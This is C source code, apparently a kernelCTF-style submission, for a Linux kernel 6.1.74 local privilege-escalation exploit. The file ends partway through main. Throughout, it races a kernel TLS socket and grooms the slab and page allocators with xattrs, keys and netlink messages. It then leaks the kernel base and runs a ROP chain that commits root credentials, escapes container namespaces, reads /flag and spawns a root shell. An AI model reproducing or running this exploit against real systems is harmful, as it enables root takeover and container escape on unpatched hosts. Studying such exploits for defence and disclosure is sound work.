#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <time.h>

#include "kernelver_6.1.74.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;
static int g_debug;
static int g_event1;
static int g_sender_sock;

void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void set_cpu_all()
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        for (int i = 0; i < 4; i++)
        {
                CPU_SET(i, &cpus);     
        }
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x20000
#define XATTR_HEAD_SIZE 0x20
#define KEY_HEAD_SIZE 0x18

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}


void __attribute__((naked)) after_pwn()
{
// Fix user stack and recover eflags since we didn't do when returning from kernel mode
        asm volatile(
                "mov %0, %%rsp\n"
                :: "r" (g_mmapped_buf + MMAP_SIZE - 0x100)
        );
        
        g_pwned = 1;


        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP2_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP2_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}

size_t prepare_rop2(uint64_t *rop2)
{
        uint64_t *rop2_start = rop2;


        *rop2++ = kaddr(POP_RDI);
        *rop2++ = kaddr(INIT_CRED);
        *rop2++ = kaddr(COMMIT_CREDS);
        *rop2++ = kaddr(AUDIT_SYSCALL_EXIT);

        // Namespace escape based on code by Crusaders of Rust
        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 1;
        *rop2++ = kaddr(FIND_TASK_BY_VPID);

        rop_rax2rdi(&rop2); // clobbers RCX

        *rop2++ = kaddr(POP_RSI);
        *rop2++ = kaddr(INIT_NSPROXY);

        *rop2++ = kaddr(SWITCH_TASK_NAMESPACES);

        *rop2++ = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX);
// eflags
        *rop2++ = 0;
        rop2 += 6;

// Userspace RIP
        *rop2++ = (uint64_t) after_pwn;

        *rop2++ = kaddr(RETURN_VIA_SYSRET);

        return (char *) rop2 - (char *) rop2_start;
}

void prepare_rop(char *buf, uint64_t kern_addr)
{
        uint64_t g2 = kaddr(PUSH_RSI_JMP_QWORD_RSI_039);

        uint64_t *rop = (uint64_t *) (buf + 0x10);

        *(uint64_t *) (buf) = kern_addr + 0x10;
        *(uint64_t *) (buf+8) = g2;

        *(uint64_t *) (buf + 0x10 + 0x39) = kaddr(POP_RSP);

        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);

        *rop++ = kaddr(RW_BUFFER);
        *rop++ = (uint64_t) g_rop2;
        *rop++ = ROP2_CONST_OFFSET + ROP2_CONST_AREA;
        *rop++ = 0;

        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

// jump over 0x39
        *rop++ = kaddr(POP_RSI_RDI);
        rop += 2;

        *rop++ = kaddr(POP_RSP);
        *rop++ = kaddr(RW_BUFFER);
}


int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - XATTR_HEAD_SIZE, XATTR_CREATE);
        if (res < 0) {
                err(1, "fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        static char attr[512];

        snprintf(attr, sizeof(attr), "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}

void free_xattr_fd(int fd, int id)
{
        static char attr[512];

        snprintf(attr, sizeof(attr), "security.%d", id);

        fremovexattr(fd, attr);
}


ssize_t read_xattr_fd(int fd, int id, char *buf, size_t sz)
{
        static char attr[512];

        snprintf(attr, sizeof(attr), "security.%d", id);

        ssize_t ret = fgetxattr(fd, attr, buf, sz);

        if (ret < 0)
                err(1, "read_xattr_fd");

        return ret;
}


#define DUP_CNT 1300
#define EPOLL_CNT 590

int epoll_fds[EPOLL_CNT];
int tfd_dups[DUP_CNT];
static int event1;

#define MAX_ATTEMPTS 30
#define HIGH_MEM_CHUNK 0x1000*1500
#define HIGH_MEM_SIZE HIGH_MEM_CHUNK*MAX_ATTEMPTS
#define PG_ALLOC_SIZE 0x200000
#define HIGH_XATTR_CNT 0
#define XATTR_CHUNK 100
#define LOW_XATTR_CNT 120000
#define XATTR_SLAB_CNT 8
#define KEY_SLAB_CNT 16
#define SLAB_CNT 16
#define PARTIAL_CNT SLAB_CNT*12
#define NEIGH_CNT SLAB_CNT*3-1
#define PCP_MMAP_PAGES 12000
#define NETLINK_CNT 100
#define KEY_CNT KEY_SLAB_CNT*10
#define KEY2_CNT 199-KEY_CNT

char *g_high_mem;
char *g_victim_mem;
int g_low_xattr_fds[LOW_XATTR_CNT];

static unsigned int g_low_xattr_cnt;

void create_watches(int fd)
{
        for (int i=0; i<DUP_CNT; i++)
        {
                tfd_dups[i] = dup(fd);

                if (tfd_dups[i] < 0)
                        err(1, "dup() failed, open files limit probably too low");
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                epoll_fds[i] = epoll_create1(0);

                if (epoll_fds[i] < 0)
                        err(1, "epoll_create() failed, open files limit probably too low");
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                for (int j=0; j<DUP_CNT; j++)
                {
                        struct epoll_event ev = { .events = EPOLLIN };

                        if (epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, tfd_dups[j], &ev) < 0)
                                err(1, "epoll_ctl");
                }
        }
}

#define NSEC_PER_SEC 1000000000UL

void ts_add(struct timespec *ts, unsigned long usecs)
{
        ts->tv_nsec += usecs * 1000;

        if (ts->tv_nsec >= NSEC_PER_SEC) {
                ts->tv_sec++;
                ts->tv_nsec -= NSEC_PER_SEC;
        }
}


char *g_stack1;
char *g_stack2;

struct child_arg {
        int tfd;
        int sock;
        int delay;
        int try;
};

int child_recv(void *arg)
{
        struct itimerspec its = { 0 };
        struct child_arg *carg = (struct child_arg *) arg;

        set_cpu(1);

        ts_add(&its.it_value, carg->delay);

        eventfd_write(g_event1, 1);

        timerfd_settime(carg->tfd, 0, &its, NULL);
        set_cpu_all();

        char recv_buf[256];
        memset(recv_buf, 'A', sizeof(recv_buf));
        int ret = recv(carg->sock, recv_buf, 10, 0);

        if (ret < 0)
                perror("recv");

        sleep(10000);

        return 0;
}

#define STACK_SIZE (1024 * 1024)    /* Stack size for cloned child */
#define NETLINK_CNT1 800
static int netlink_socks[NETLINK_CNT1];

void setup_tls(int sock, int is_rx)
{
        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info = {.info.version = TLS_1_2_VERSION, .info.cipher_type = TLS_CIPHER_AES_CCM_128};

        if (setsockopt(sock, SOL_TLS, is_rx ? TLS_RX : TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");
}

void sig_handler(int sig, siginfo_t *info, void *ucontext)
{
        printf("Got signal %d from pid %d\n", sig, info->si_pid);
}

int sender(void *a)
{
        g_sender_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        if (g_sender_sock < 0)
                err(1, "sender socket");

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (connect(g_sender_sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        setup_tls(g_sender_sock, 0);

        char buf[256];
        memset(buf, 'B', sizeof(buf));
        int ret = send(g_sender_sock, buf, 100, 0);
        sleep(10000);
        exit(0);
}

key_serial_t alloc_key(int id, size_t len, char *buf)
{
        key_serial_t serial;
        char desc[256];
        len -= KEY_HEAD_SIZE;

        snprintf(desc, sizeof(desc), "%d", id);

        serial = syscall(SYS_add_key, "user", desc, buf, len, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0) {
                err(1, "key add");
        }

        return serial;
}

key_serial_t alloc_keyring(int id)
{
        key_serial_t serial;
        char desc[512];

        memset(desc, ' ', 256);        

        snprintf(desc, sizeof(desc), "%d", id);

        serial = syscall(SYS_add_key, "keyring", desc, NULL, 0, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0) {
                err(1, "keyring add");
        }

        return serial;
}

int prepare_netlink_listener(unsigned int port_id)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id;
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)))
                err(1, "bind netlink fail\n");

        return sock;
}

int g_netlinks[NETLINK_CNT];
int g_netlinks_send[NETLINK_CNT];

void free_netlink(int sock)
{
        recv(sock, g_mmapped_buf, MMAP_SIZE, 0);
}

void prepare_netlinks()
{
        unsigned int port_id = 0x6666;
        for (int i = 0; i < NETLINK_CNT; i++)
        {
                g_netlinks[i] = prepare_netlink_listener(port_id + i);

                int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
                if (sock == -1) {
                        err(1, "socket netlink\n");
                }

                g_netlinks_send[i] = sock;
        }
}

int alloc_netlink(unsigned int idx, size_t len, char *buf)
{
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = 0x6666 + idx;

        ssize_t n = sendto(g_netlinks_send[idx], buf, len - 0x140, MSG_DONTWAIT, (struct sockaddr*)&addr, sizeof(addr));

        if (n < 0)
                err(1, "sendto netlink\n");

        return g_netlinks[idx];
}

unsigned int parse_zoneinfo(char *buf, unsigned int *high, unsigned int *batch)
{
        char *t;

        t = strstr(buf, "zone    DMA32");
        t = strstr(t, "cpu: 1");
        t = strstr(t, "count: ");

        unsigned int cnt = atoi(t+7);

        if (high) {
                t = strstr(t, "high: ");
                *high = atoi(t+6);
        }

        if (batch) {
                t = strstr(t, "batch: ");
                *batch = atoi(t+7);
        }

        return cnt;
        
}

unsigned int get_pagecount(unsigned int *high, unsigned int *batch)
{
        static char zibuf[10000];
        static int fdzi = -1;

        if (fdzi < 0) {
                fdzi = open("/proc/zoneinfo", 0, O_DIRECT);
                if (fdzi < 0)
                        err(1, "open zoneinfo");
        }

        lseek(fdzi, SEEK_SET, 0);
        read(fdzi, zibuf, sizeof(zibuf));               

        return parse_zoneinfo(zibuf, high, batch);
}

struct list_head {
        struct list_head *         next;                 /*     0   0x8 */
        struct list_head *         prev;                 /*   0x8   0x8 */

        /* size: 16, cachelines: 1, members: 2 */
        /* last cacheline: 16 bytes */
};

struct simple_xattr {
        struct list_head           list;                 /*     0  0x10 */
        char *                     name;                 /*  0x10   0x8 */
        size_t                     size;                 /*  0x18   0x8 */
        char                       value[];              /*  0x20     0 */
};

unsigned int find_netlink(char *mem, size_t mem_size, unsigned int *which_subpage)
{
        for (int i = 0; i < mem_size; i+= 8)
        {
                uint64_t *p = (uint64_t *) (mem+i);

                if (*p == 0x4343434343434343L || *p == 0x4444444444444444L) {
                        *which_subpage = (*p == 0x4343434343434343L) ? 0 : 1;

                        printf("Netlink found at offset %d subpage: %d\n", i, *which_subpage);
                        return *(p+1);
                }
        }

        errx(1, "Netlink not found");

}

char *find_key(char *mem, size_t mem_size, int *id_ptr)
{
        char *key = NULL;
        uint64_t key_kern;

        for (int i = 0; i < mem_size; i+= 8)
        {
                uint64_t *p = (uint64_t *) (mem+i);

                if ((*p >> 32) == 0xffffffff) {
                        printf("Found possible key: %p\n", *p);

                        if ((*p & 0xfff) == (KEY_TYPE_KEYRING & 0xfff) && (*p >> 32) == 0xffffffff) {
                                key = (char *) p - 0x98;
                                key_kern = *(uint64_t *) (key + 0x38) - 0x38;
                                *id_ptr = atoi(key+0x92);
                                g_kernel_text = *p - (KEY_TYPE_KEYRING - 0xffffffff81000000L);

                                printf("Key found at: %p/%p id: %d kernel text: %p\n", key_kern, key, *id_ptr, g_kernel_text);
                                break;
                        }
                }
        }

        return key;
}

void flush_pcp(int xattr_fd, unsigned int flush_cnt)
{
        for (unsigned int i = 0; i < (flush_cnt/8); i++)
        {
                free_xattr_fd(xattr_fd, 10000 + i);
        }
}

void drain_pcp_order0(int xattr_fd, unsigned int cnt)
{
        unsigned int high, batch, pcp1, pcp2;
        
        pcp1 = get_pagecount(&high, &batch);

// kmalloc-256
        for (unsigned int i = 0; i < SLAB_CNT*(cnt+2); i++)
        {
                alloc_xattr_fd(xattr_fd, 40000 + i, 256, g_mmapped_buf);

                pcp2 = get_pagecount(&high, &batch);

                int delta = pcp2 - pcp1;

                if (delta == -1) {
                        if (--cnt < 1)
                                break;
                }

                pcp1 = pcp2;
        }

        if (cnt > 0)
                errx(1, "Unable to drain pcp, remaining: %d\n", cnt);

}

unsigned int get_fresh_slabs(int xattr_fd)
{
        unsigned int high, batch, pcp1, pcp2;

        

        unsigned int detected = 0;

// key_jar
        for (unsigned int i = 0; i < KEY_CNT; i++)
        {
                alloc_key(1000+i, 25, g_mmapped_buf);
        }

        pcp1 = get_pagecount(&high, &batch);
// kmalloc-192
        for (unsigned int i = 0; i < 21*4; i++)
        {
                alloc_xattr_fd(xattr_fd, 30000 + i, 192, g_mmapped_buf);

                pcp2 = get_pagecount(&high, &batch);

                int delta = pcp2 - pcp1;

                if (delta == -1) {
                        detected = 1;

                        break;
                }

                pcp1 = pcp2;
        }

        if (!detected)
                errx(1, "Unable to detect new slab for kmalloc-192\n");

        return (high-pcp2+100);
}


unsigned int prepare_pcp(int xattr_fd)
{
        unsigned int high, batch, pcp1, pcp2;

        for (unsigned int i = 0; i < PCP_MMAP_PAGES / 8; i++)
        {
                alloc_xattr_fd(xattr_fd, 10000 + i, 32000, g_mmapped_buf);
        }

        
        pcp1 = get_pagecount(&high, &batch);

        unsigned int detected = 0;
        for (unsigned int i = 0; i < SLAB_CNT*2000; i++)
        {
                alloc_xattr_fd(xattr_fd, 20000 + i, 256, g_mmapped_buf);

                pcp2 = get_pagecount(&high, &batch);

                int delta = pcp2 - pcp1;

                if (delta >= (int) (batch - 2)) {
                        printf("Detected new pcp batch batch: %d high: %d\n", batch, high);

                        for (unsigned int j = 0; j < SLAB_CNT*(batch-2) - 3; j++)
                        {
                                alloc_xattr_fd(xattr_fd, 20000 + i + j + 1, 256, g_mmapped_buf);
                        }

                        detected = 1;

                        break;
                }

                pcp1 = pcp2;
        }

        if (!detected)
                errx(1, "Unable to detect new pcp batch\n");

        return (high-pcp2+100);
}

void stage2(struct simple_xattr *xptr, int xattr_fd)
{
        uint64_t our_xattr_id = * (uint64_t *) (xptr->value + 8);
        printf("Stage 2 xattr size: %d name ptr: %p prev: %p next: %p id: %ld\n", xptr->size, xptr->name, xptr->list.prev, xptr->list.next, our_xattr_id);

        xptr->size = 0xffff;

// Drain ZONE_NORMAL
        size_t sz = 1024*1024*1024;
        char *m = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (m == MAP_FAILED)
                err(1, "mmap highmem");

        memset(m, 'A', sz);


        prepare_netlinks();

        unsigned int i;
        unsigned int max = our_xattr_id + XATTR_SLAB_CNT*3;

// increase node->nr_partial
        for (i = 0; i < XATTR_SLAB_CNT*6; i++)
        {
                if ((i % 2) == 0)
                        free_xattr_fd(g_low_xattr_fds[i], i);
        }

        unsigned int flush_cnt = prepare_pcp(xattr_fd);

//        printf("flush_cnt: %d\n", flush_cnt);

        if (flush_cnt > PCP_MMAP_PAGES)
                errx(1, "PCP_MMAP_PAGES too low");


        for (i = our_xattr_id+1; i < max; i++)
        {
                free_xattr_fd(g_low_xattr_fds[i], i);
        }

        for (; i < (max + XATTR_SLAB_CNT*3); i++)
        {
                if ((i % 2) == 0)
                        free_xattr_fd(g_low_xattr_fds[i], i);
        }

// At this point at least 1 slab previously belonging two xattrs was discarded


        flush_pcp(xattr_fd, flush_cnt);

        memset(g_mmapped_buf, 'C', 0x1000);
        memset(g_mmapped_buf+0x1000, 'D', 0x1000);

        for (int i = 0; i < NETLINK_CNT; i++)
        {
                *(uint64_t *) (g_mmapped_buf + 8) = i;
                *(uint64_t *) (g_mmapped_buf + 0x1008) = i;
                alloc_netlink(i, 0x1200, g_mmapped_buf);
        }

        read_xattr_fd(g_low_xattr_fds[our_xattr_id], our_xattr_id, g_mmapped_buf, 0xffff);

        unsigned int which_subpage;
        unsigned int netlink_id = find_netlink(g_mmapped_buf, MMAP_SIZE, &which_subpage);

        get_fresh_slabs(xattr_fd);


        free_netlink(g_netlinks[netlink_id]);

        if (which_subpage == 0)
                drain_pcp_order0(xattr_fd, 1);

        key_serial_t keyrings[KEY2_CNT];

        for (i = 0; i < KEY2_CNT; i++)
        {
                keyrings[i] = alloc_keyring(i);
        }

        read_xattr_fd(g_low_xattr_fds[our_xattr_id], our_xattr_id, g_mmapped_buf, 0xffff);

        int our_key_id;
        char *key_ptr = find_key(g_mmapped_buf, 0xffff, &our_key_id);

        if (!key_ptr) {
                errx(1, "Key not found in memory, aborting !");
        }

        
        int ret = syscall(SYS_keyctl, KEYCTL_RESTRICT_KEYRING, keyrings[our_key_id], 0, 0);
        if (ret < 0)
                perror("keyctl restrict");

        read_xattr_fd(g_low_xattr_fds[our_xattr_id], our_xattr_id, g_mmapped_buf, 0xffff);

        char *key_restrict = *(char **) (key_ptr + 0xd0);

        printf("Key restrict: %p\n", key_restrict);

        xptr->name = key_restrict;

        close(g_low_xattr_fds[our_xattr_id]);

        time_t t1 = time(NULL);

        char *fname;
        asprintf(&fname, "/tmp/x_%d", our_xattr_id / XATTR_CHUNK);
        ret = unlink(fname);

        if (ret < 0)
                perror("unlink");

        printf("Unlink took %d seconds\n", time(NULL) - t1);
        uint64_t buf[8];

/*
0xffffffff812bbdb7:     mov rax, qword ptr [rcx + 8]
0xffffffff812bbdbb:     test rax, rax
0xffffffff812bbdbe:     je 0xffffffff812bbdcf
0xffffffff812bbdc0:     mov rsi, qword ptr [rcx]
0xffffffff812bbdc3:     lea rdi, [rbp - 0x10]
0xffffffff812bbdc7:     mov rdx, r14
0xffffffff812bbdca:     call    __x86_indirect_thunk_rax
*/
        buf[0] = kaddr(G1); // RIP

        buf[1] = (uint64_t) xptr->list.next + 0x20; // RCX

        alloc_xattr_fd(xattr_fd, 50000, 64, buf);

        g_rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (g_rop2_len > ROP2_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", g_rop2_len, ROP2_CONST_OFFSET);

        memset(g_mmapped_buf, 'Z', 0x1000);
        prepare_rop(g_mmapped_buf, buf[1]);

        t1 = time(NULL);
        for (int i = 0; i < XATTR_CHUNK*3; i++)
        {
                alloc_xattr_fd(xattr_fd, 60000+i, 2049, g_mmapped_buf);
        }

// Trigger RCE
        ret = syscall(SYS_add_key, "user", "pwn", "abcd", 4, keyrings[our_key_id]);

        if (ret < 0)
                err(1, "add key");
}

int one_attempt(int tfd, int tfd2, unsigned int force_delay)
{
        static unsigned int try = 0;

        char *fname;
        asprintf(&fname, "/tmp/y_%d", try++);
        int xattr_fd = open(fname, O_RDWR|O_CREAT);
        if (xattr_fd < 0)
                err(1, "xattr open\n");

        free(fname);

        int tfd3 = timerfd_create(CLOCK_MONOTONIC, 0);

        int sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock_serv < 0)
                err(1, "socket");

        int flag = 1;
        setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

        struct sockaddr_in addr, peer_addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (bind(sock_serv, &addr, sizeof(addr)) < 0)
                err(1, "connect");

        listen(sock_serv, 99999);


        pid_t sender_pid = clone(sender, g_stack2 + STACK_SIZE, CLONE_FS | CLONE_FILES | CLONE_VM | SIGCHLD, NULL);

        if (sender_pid < 0)
                err(1, "clone sender");


        socklen_t sz = sizeof(peer_addr);
        int sock = accept(sock_serv, &peer_addr, &sz);

        if (sock < 0)
                err(1, "accept");

        set_cpu(0);


        for (int i = 0; i < PARTIAL_CNT; i++)
        {
                alloc_xattr_fd(xattr_fd, i, 193, g_mmapped_buf);
        }


// Prepare victim slab
#define VICTIM_IDX 18
#define VICTIM_IDX2 VICTIM_IDX+SLAB_CNT
        for (int i = 0; i < NEIGH_CNT; i++)
        {
                if (i == VICTIM_IDX)
                        setup_tls(sock, 1);
                else
                        alloc_xattr_fd(xattr_fd, i+1000, 193, g_mmapped_buf);
        }

        for (int i = 0; i < SLAB_CNT; i++)
        {
                alloc_xattr_fd(xattr_fd, i+2000, 193, g_mmapped_buf);
        }
        

// Empty slab around victim object
        for (int i = 0; i < NEIGH_CNT; i++)
        {
                if (i != VICTIM_IDX && i != VICTIM_IDX2)
                        free_xattr_fd(xattr_fd, i + 1000);
        }


// Increase per cpu partial count
        for (int i = 0; i < SLAB_CNT*7; i++)
        {
                if ((i % 4) == 0)
                        free_xattr_fd(xattr_fd, i);
        }


        if (try < MAX_ATTEMPTS) {
                if (madvise(g_high_mem, HIGH_MEM_CHUNK, MADV_PAGEOUT) < 0)
                        err(1, "madvise");
                g_high_mem += HIGH_MEM_CHUNK;
        } else if (g_victim_mem) {
                munmap(g_victim_mem, PG_ALLOC_SIZE);
        }


        struct itimerspec its = { 0 };

        int delay = force_delay;

        if (!delay) {
                delay = 28 + (rand() % 4);
        }
        

        struct child_arg carg = {
                .tfd = tfd,
                .sock = sock,
                .try = try,
                .delay = delay
        };

        printf("delay: %d attempt: %d\n", carg.delay, carg.try);

        pid_t pid = clone(child_recv, g_stack1 + STACK_SIZE, CLONE_FS | CLONE_FILES | CLONE_VM | SIGCHLD, (void *) &carg);

        eventfd_t event_value;
        eventfd_read(g_event1, &event_value);

        ts_add(&its.it_value, 1000);

        timerfd_settime(tfd3, 0, &its, NULL);
        
        uint64_t v1;
        read(tfd3, &v1, sizeof(v1));

        close(sock);

        usleep(100);

        g_victim_mem = mmap((void *) 0x6600000, PG_ALLOC_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_victim_mem == MAP_FAILED)
                err(1, "mmap");

        sleep(0.5);

        set_cpu(1);

        int success = 0;

        char *xattr_ptr;
        for (int i = 0; i < PG_ALLOC_SIZE; i += 8)
        {
                uint64_t *p = (uint64_t *) (g_victim_mem + i);

                if (*p) {
                        if (*p == 0x4242424242424242L) {
                                xattr_ptr = (char *) p - 0x20;
                                success = 1;
                                break;
                        }
                }
        }

        if (success)
                stage2((struct simple_xattr *) xattr_ptr, xattr_fd);

        set_cpu(0);

        close(sock_serv);
        close(g_sender_sock);
        close(tfd3);
        close(xattr_fd);

        kill(sender_pid, 9);
        kill(pid, 9);

        int status;

        if (waitpid(pid, &status, 0) < 0)
                err(1, "waitpid");

        if (waitpid(sender_pid, &status, 0) < 0)
                err(1, "waitpid");

        sleep(0.5);

        return success;

}

int main(int argc, char **argv)
{
        int ret;
        struct rlimit rlim;
        unsigned int force_delay = 0;

        system("cat /proc/cpuinfo");

        g_low_xattr_cnt = LOW_XATTR_CNT;

        if (argc > 1 && !strcmp(argv[1], "debug")) {
                g_debug = 1;
        } else if (argc > 2) {
                int num;
                if ((num = atoi(argv[2])) > 0) {
                        g_low_xattr_cnt = num;
                }

                if (argc > 3 && (num = atoi(argv[3])) > 0) {
                        force_delay = num;
                }
        }
                
        setbuf(stdout, NULL);

        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
                err(1, "setrlimit()");

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

        struct timeval seed_time;
        gettimeofday(&seed_time,NULL);

        srand((seed_time.tv_sec * 1000) + (seed_time.tv_usec / 1000));

        set_cpu(0);

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(ctr(aes-generic))"
        };
        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);

        if (bind(c1, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                err(1, "af_alg bind");

        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");


        g_stack1 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        g_stack2 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (g_stack1 == MAP_FAILED || g_stack2 == MAP_FAILED) {
                perror("mmap stack");
                exit(1);

        }

#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        
        int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
        int tfd2 = timerfd_create(CLOCK_MONOTONIC, 0);
        create_watches(tfd);


        g_event1 = eventfd(0, 0);

        printf("parent pid: %d\n", getpid());


        mlockall(MCL_CURRENT);

        memset(g_mmapped_buf, 'B', 0x1000);

        g_high_mem = mmap((void *) 0x26600000L, HIGH_MEM_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_SHARED|MAP_POPULATE, -1, 0);
        if (g_high_mem == MAP_FAILED)
                err(1, "mmap highmem");

        int xfd = -1;
        unsigned int xattr_fd_idx = 0;

        char fname[512];
        for (int i = 0; i < g_low_xattr_cnt; i++)
        {
                if (i == 0 || (i / XATTR_CHUNK) > xattr_fd_idx) {
                        xattr_fd_idx = i / XATTR_CHUNK;
                        if ((i % 10000) == 0)
                                printf("xattrs %d/%d\n", i, g_low_xattr_cnt);

                        snprintf(fname, sizeof(fname), "/tmp/x_%d", xattr_fd_idx);
                        xfd = open(fname, O_RDWR|O_CREAT, 0600);
                        if (xfd < 0)
                                err(1, "xattr open\n");

                }

                *(uint64_t *) (g_mmapped_buf+8) = i;

                g_low_xattr_fds[i] = alloc_xattr_fd(xfd, i, 2049, g_mmapped_buf);
        }

        set_cpu(0);

        while(1)
        {
                if (one_attempt(tfd, tfd2, force_delay))
                        break;

        }

        if (!g_pwned) {
